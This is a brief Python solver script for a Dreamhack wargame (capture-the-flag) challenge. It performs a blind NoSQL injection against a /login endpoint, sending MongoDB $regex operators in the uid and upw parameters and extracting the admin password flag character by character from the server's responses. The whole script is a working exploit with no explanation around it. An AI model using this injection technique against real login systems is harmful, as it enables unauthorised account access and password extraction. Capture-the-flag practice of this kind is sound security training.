# Wargame site URL: https://dreamhack.io/wargame/challenges/90

import requests, string

HOST = '(URL)'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''

for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break
    
    print(f'FLAG: DH{{{flag}}}')
